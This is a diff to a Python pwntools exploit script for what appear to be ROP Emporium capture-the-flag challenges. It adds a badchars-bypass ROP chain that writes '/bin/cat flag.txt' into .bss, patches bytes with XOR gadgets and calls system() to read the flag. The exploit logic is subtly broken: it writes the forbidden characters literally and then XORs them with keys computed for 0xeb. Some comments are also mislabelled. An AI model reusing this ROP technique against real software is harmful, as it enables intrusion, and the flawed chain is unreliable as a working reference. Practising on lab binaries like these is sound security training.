@@ -122,7 +122,7 @@ def write4(path):
 
     payload += b'\x90\x08\x40\x00\x00\x00\x00\x00' # pop r14, pop r15, ret
     payload += b'\x68\x10\x60\x00\x00\x00\x00\x00' # r14 -> .bss+8
-    payload += b'\x20\x66\x6c\x61\x67\x2e\x74\x78' # r15 = " flax.tx"
+    payload += b'\x20\x66\x6c\x61\x67\x2e\x74\x78' # r15 = " flag.tx"
     payload += b'\x20\x08\x40\x00\x00\x00\x00\x00' # mov [r14], r15
 
     payload += b'\x90\x08\x40\x00\x00\x00\x00\x00' # pop r14, pop r15, ret
@@ -146,8 +146,117 @@ def write4(path):
     return True
 
 
-def badchars():
+def __find_badchars(payload, forbidden=None):
+    """
+    Scan a binary string for a list of integer(s) we want to avoid.
+    Found integer and their index are added to a list.
+    :param payload: b'' to scan
+    :param forbidden: list of ints
+    :return: list of (badchar, index)
+    """
+
+    found = []
+
+    if forbidden is not None:
+        i = 0
+        print("Scanning badchars\n=================")
+        for b in payload:
+            if b in forbidden:
+                print("{} at index: {}".format(hex(b), i))
+                found.append((b, i))
+            i += 1
+
+    return found
+
+
+def __find_candidate_keys(payoad, found, forbidden):
     pass
+
+
+def badchars(path):
+
+    payload = b''
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
+    payload += b'\x42\x42\x42\x42\x42\x42\x42\x42'  # fill buffer (overwrite RSP)
+
+    # Write to .bss
+    payload += b'\x3b\x0b\x40\x00\x00\x00\x00\x00'  # pop r12, pop r13, ret
+    payload += b'\x2f\x62\x69\x6e\x2f\x63\x61\x74'  # r12 = "/bin/cat"
+    payload += b'\x80\x10\x60\x00\x00\x00\x00\x00'  # r13 -> .bss
+    payload += b'\x34\x0b\x40\x00\x00\x00\x00\x00'  # mov [r13], r12
+
+    payload += b'\x3b\x0b\x40\x00\x00\x00\x00\x00'  # pop r12, pop r13, ret
+    payload += b'\x20\x66\x6c\x61\x67\x2e\x74\x78' # r12 = " flag.tx"
+    payload += b'\x88\x10\x60\x00\x00\x00\x00\x00'  # r13 -> .bss+8
+    payload += b'\x34\x0b\x40\x00\x00\x00\x00\x00'  # mov [r13], r12
+
+    payload += b'\x3b\x0b\x40\x00\x00\x00\x00\x00'  # pop r12, pop r13, ret
+    payload += b'\x74\x00\x00\x00\x00\x00\x00\x00'  # r12 = "t\x00"
+    payload += b'\x90\x10\x60\x00\x00\x00\x00\x00'  # r13 -> .bss+0x10
+    payload += b'\x34\x0b\x40\x00\x00\x00\x00\x00'  # mov [r13], r12
+
+    # Fix the \xEB bytes
+    # --- 0xc4 ^ 0xeb = 0x2f ("/")
+    payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
+    payload += b'\xc4\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0xc4 (xorkey n°1)
+    payload += b'\x80\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss (found badchar n°1)
+    payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
+    # --- 0x89 ^ 0xeb = 0x62 ("b")
+    payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
+    payload += b'\x89\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0x89 (xorkey n°2)
+    payload += b'\x81\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+1 (found badchar n°2)
+    payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
+    # --- 0x82 ^ 0xeb = 0x69 ("i")
+    payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
+    payload += b'\x82\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0x82 (xorkey n°3)
+    payload += b'\x82\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+2 (found badchar n°3)
+    payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
+    # --- 0x85 ^ 0xeb = 0x6e ("n")
+    payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
+    payload += b'\x85\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0x85 (xorkey n°4)
+    payload += b'\x83\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+3 (found badchar n°3)
+    payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
+    # --- 0xc4 ^ 0xeb = 0x2f ("/")
+    payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
+    payload += b'\xc4\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0xc4 (xorkey n°5)
+    payload += b'\x84\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+4 (found badchar n°5)
+    payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
+    # --- 0x88 ^ 0xeb = 0x63 ("c")
+    payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
+    payload += b'\x88\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0x88 (xorkey n°6)
+    payload += b'\x85\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+5 (found badchar n°6)
+    payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
+    # --- 0xcb ^ 0xeb = 0x20 (" ")
+    payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
+    payload += b'\xcb\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0xcb (xorkey n°7)
+    payload += b'\x88\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+8 (found badchar n°7)
+    payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
+    # --- 0x8d ^ 0xeb = 0x66 (f")
+    payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
+    payload += b'\x8d\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0x8d (xorkey n°8)
+    payload += b'\x89\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+9 (found badchar n°8)
+    payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
+
+    # Get flag
+    payload += b'\x39\x0b\x40\x00\x00\x00\x00\x00'  # pop rdi, ret
+    payload += b'\x80\x10\x60\x00\x00\x00\x00\x00'  # ->"/bin/cat flag.txt"
+    payload += b'\xe8\x09\x40\x00\x00\x00\x00\x00'  # call _system()
+    payload += b'\x43\x43\x43\x43\x43\x43\x43\x43'  # dummy (stack alignment)
+    payload += b'\xb9\x07\x40\x00\x00\x00\x00\x00'  # hlt
+
+    bad = [0x20, 0x2f, 0x62, 0x63, 0x66, 0x69, 0x6e, 0x73]
+    found =  __find_badchars(payload, forbidden=bad)
+    #print(found)
+
+    p = process(path)
+    p.sendline(payload)
+    fluff = p.recv()
+    flag = p.recvline()
+    success(flag)
+    return True
 
 
 def fluff():
